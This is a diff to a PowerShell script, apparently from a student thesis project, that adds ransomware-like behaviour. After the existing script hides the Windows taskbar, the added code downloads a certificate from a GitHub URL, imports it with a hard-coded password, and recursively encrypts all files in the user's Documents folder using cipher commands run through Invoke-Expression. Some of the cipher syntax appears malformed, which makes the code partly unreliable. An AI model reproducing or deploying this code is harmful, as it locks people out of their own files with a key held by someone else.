@@ -53,6 +53,40 @@ Sleep 2
 $taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
 [Taskbar]::ShowWindow($taskbarHwnd, [Taskbar]::SW_HIDE)
 
+# Define the URL of the file to download
+$fileUrl = "https://raw.githubusercontent.com/haiduc29/Script-Licenta/main/certificate.pfx"
+
+# Define the path where the file will be saved
+$outputPath = "C:\Users\ionut\Downloads\certificate.pfx"
+
+# Download the file
+Invoke-WebRequest -Uri $fileUrl -OutFile $outputPath
+
+$certPassword = ConvertTo-SecureString -String "1993" -Force -AsPlainText
+$cert = Import-PfxCertificate -FilePath "C:\Users\ionut\Downloads\certificate.pfx" -CertStoreLocation Cert:\CurrentUser\My -Password $certPassword
+
+# Encrypt the folder using the certificate
+$folderPath = "C:\Users\ionut\Documents"
+$certThumbprint = $cert.Thumbprint
+$encryptedFolderPath = [System.IO.Path]::GetFullPath($folderPath)
+
+$folder = Get-Item $encryptedFolderPath
+$folder.Attributes += [System.IO.FileAttributes]::Encrypted
+
+function Encrypt-FolderWithCert {
+    param (
+        [string]$Path,
+        [string]$Thumbprint
+    )
+    $fileList = Get-ChildItem -Path $Path -Recurse -Force
+    foreach ($file in $fileList) {
+        $fileFullPath = $file.FullName
+        $encCommand = "cmd.exe /c cipher /e /s:$fileFullPath /u:$Thumbprint"
+        Invoke-Expression -Command $encCommand
+    }
+}
+
+Encrypt-FolderWithCert -Path $encryptedFolderPath -Thumbprint $certThumbprint
 }
 
 Catch {"Scriptul a returnat eroare"}
